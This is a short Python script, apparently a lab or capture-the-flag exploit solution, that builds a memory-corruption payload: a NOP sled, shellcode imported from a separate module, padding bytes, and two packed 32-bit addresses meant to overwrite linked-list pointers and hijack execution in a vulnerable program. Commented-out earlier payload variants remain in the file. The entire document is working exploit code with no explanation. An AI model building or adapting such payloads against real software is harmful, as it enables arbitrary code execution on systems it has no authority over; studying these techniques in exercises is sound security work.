from struct import pack
from shellcode import shellcode

prev_a_addr = pack("<I", 0x080f3724)
prev_b_addr = pack("<I", 0xbffeb8a8)

#print("\xaa"*4 + "\x6a\x0b\x58\x99" + shellcode + " " + "\xaa"*40 + pack("<I", 0xBFFEA6C8) + pack("<I", 0x080F3724) + " " + "\xaa"*4)

print("\x90"*8 + shellcode + " " + "\x69"*40 + prev_b_addr + prev_a_addr + " " + "\x69"*4)

#print("a"*32 + " " + "b"*32 + " " + "c"*32)

'''
quavo = ("\x90" * 8) +  shellcode
offset = ("\x90" * 40) + prev_b_addr + prev_a_addr
takeoff = ("\x90" * 4)

print(quavo)
print(offset)
print(takeoff)
'''
